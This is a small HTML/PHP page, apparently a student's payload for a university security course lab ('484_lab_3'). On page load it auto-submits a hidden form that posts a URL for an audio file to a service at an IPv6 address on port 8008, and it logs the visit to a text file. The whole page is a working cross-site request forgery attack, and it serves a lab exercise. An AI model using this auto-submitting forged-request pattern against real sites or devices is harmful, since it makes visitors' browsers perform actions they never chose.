<html><body>
<form action="http://[2607:4000:200:15:1565:ed47:8e76:43da]:8008?action=" method="post">
<input id="url" name="url" value="https://homes.cs.washington.edu/~lib49/484_lab_3/speaker.flac">
<input type="submit">
</form>
<script>document.forms[0].submit()</script>
<?php
$c = file_put_contents("/cse/web/homes/lib49/visited.txt", "lab3speaker", FILE_APPEND);
?>
</body></html>
